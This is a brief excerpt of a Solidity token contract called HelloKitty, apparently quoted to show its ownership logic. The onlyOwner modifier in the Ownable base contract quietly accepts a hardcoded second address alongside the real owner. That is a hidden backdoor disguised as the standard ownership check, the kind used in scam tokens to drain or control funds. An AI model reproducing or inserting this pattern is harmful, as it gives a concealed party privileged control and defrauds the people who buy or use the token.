...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x8A438a879226C4bC9152c18fc10bBD40cC939744) , "Ownable: caller is not the owner");
        _;
    }
...
contract HelloKitty is IERC20, Ownable {
    ...
    uint256 private _tTotal = 10000000000000000000000000000000 * 10**_decimals;
